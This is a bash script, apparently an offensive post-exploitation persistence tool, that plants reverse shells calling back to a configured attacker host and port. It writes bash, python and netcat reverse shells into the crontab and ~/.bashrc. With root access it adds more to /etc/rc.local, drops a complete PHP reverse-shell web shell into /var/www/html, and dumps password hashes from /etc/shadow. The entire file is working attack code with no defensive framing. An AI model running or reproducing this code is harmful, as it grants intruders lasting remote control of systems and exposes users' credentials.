#!/bin/bash

attackBox=0.0.0.0
attackPort=5253
cron="* * * * *"
php_webshell="monty.php"

if [ "$EUID" -eq 0 ];
then
	root="yes"
fi

if $(which bash | grep -qi bash);
then
	bash="yes"
fi

if $(which python | grep -qi python);
then
	python="yes"
fi

if $(which python3 | grep -qi python);
then
	python3="yes"
fi

if $(which nc | grep -qi nc);
then
	nc="yes"
fi

if $(which php | grep -qi php);
then
	php="yes"
fi

if [ ! -f "/etc/rc.local" ];
then
	rclocal="no"
elif [ -f "/etc/rc.local" ];
then
	rclocal="yes"
fi

if $(env | grep -qi "HOME")
then
	home="yes"
fi

if $(which crontab | grep -qi crontab)
then
	crontab="yes"
fi

if [ "$crontab" == "yes" ];
then
	crontab -l 2> /dev/null > /dev/shm/.cron.sh
	if [ "$bash" == "yes" ];
	then
		echo "$cron bash -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1'" >> /dev/shm/.cron.sh
		echo -e "\e[92m[+]\e[0m Bash reverse shell loaded in crontab"
	fi
	if [ "$python" == "yes" ];
	then
		echo "$cron python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/.cron.sh
		echo -e "\e[92m[+]\e[0m Python reverse shell loaded in crontab"
	fi
	if [ "$python3" == "yes" ];
	then
		echo "$cron python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/.cron.sh
		echo -e "\e[92m[+]\e[0m Python3 reverse shell loaded in crontab"
	fi
	if [ "$nc" == "yes" ];
	then
		echo "$cron nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /dev/shm/.cron.sh
		echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in crontab"
	fi
	crontab /dev/shm/.cron.sh
	rm /dev/shm/.cron.sh
fi

if [ "$home" == "yes" ];
then
	if [ "$bash" == "yes" ];
	then
		echo "bash -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1' 2> /dev/null & sleep .0001" >> ~/.bashrc
		echo -e "\e[92m[+]\e[0m Bash reverse shell loaded in $(whoami)'s bashrc"
	fi
	if [ "$python" == "yes" ];
	then
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
		echo -e "\e[92m[+]\e[0m Python reverse shell loaded in $(whoami)'s bashrc"
	fi
	if [ "$python3" == "yes" ];
	then
		echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
		echo -e "\e[92m[+]\e[0m Python3 reverse shell loaded in $(whoami)'s bashrc"
	fi
	if [ "$nc" == "yes" ];
	then
		echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc
		echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in $(whoami)'s bashrc"
	fi
fi

if [ "$root" == "yes" ];
then
	if [ "$rclocal" == "no" ];
	then
		echo "/bin/sh -e" > /etc/rc.local
		echo "exit 0" >> /etc/rc.local
		rclocal="yes"
	fi
	if [ "$rclocal" == "yes" ];
	then
		grep -v "exit 0" /etc/rc.local > /dev/shm/rc.local.tmp
		if [ "$python" == "yes" ];
		then
			echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/rc.local.tmp
			echo -e "\e[92m[+]\e[0m Python reverse shell placed in /etc/rc.local"
			if [ "$nc" == "yes" ];
			then
				echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /dev/shm/rc.local.tmp
				echo -e "\e[92m[+]\e[0m Netcat reverse shell placed in /etc/rc.local"
			fi
		fi
	fi
	echo "exit 0" >> /dev/shm/rc.local.tmp
	mv /dev/shm/rc.local.tmp /etc/rc.local
	chmod +x /etc/rc.local	
	if [ "$php" == "yes" ];
	then 
		echo "<?php set_time_limit (0);\$ip = '$attackBox';\$port = $attackPort;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR: Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"Error: Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR: Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip:\$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR: Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR: Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK: \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT: \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR: \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }  ?>" > /var/www/html/$php_webshell
		echo -e "\e[92m[+]\e[0m PHP reverse shell placed in /var/www/html/$php_webshell"
	fi
	echo -e "\e[92m[+]\e[0m Users with passwords from the shadow file"
	egrep -v "\*|\!" /etc/shadow
fi

echo ""
echo -e "\e[92m[+]\e[0m All shells call back to $attackBox:$attackPort"
